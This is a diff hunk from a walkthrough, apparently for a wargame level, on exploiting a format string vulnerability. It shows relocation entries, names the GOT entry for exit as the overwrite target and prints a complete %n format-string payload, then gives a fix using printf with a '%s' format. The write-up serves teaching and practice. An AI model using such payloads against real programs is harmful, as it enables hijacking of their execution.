@@ -37,6 +37,7 @@ Next step consists in choosing a memory location that will ultimately alter `%ei
      0804a008  00000307 R_386_JUMP_SLOT   00000000   printf
      0804a00c  00000407 R_386_JUMP_SLOT   00000000   exit
 The last entry with address `0x0804a00c` is the interesting one, this will be the target address. Following is the format string used to exploit this level:
+
      \x0c\xa0\x04\x08\x0d\xa0\x04\x08\x0e\xa0\x04\x08\x0f\xa0\x04\x08A%108\$n%5\$0206d%109\$n%5\$032d%110\$n%111\$n
 
 Note: to avoid such a vulnerability, you should use `printf("%s", argv[3])` instead. Refer to the suggested reading material for details.
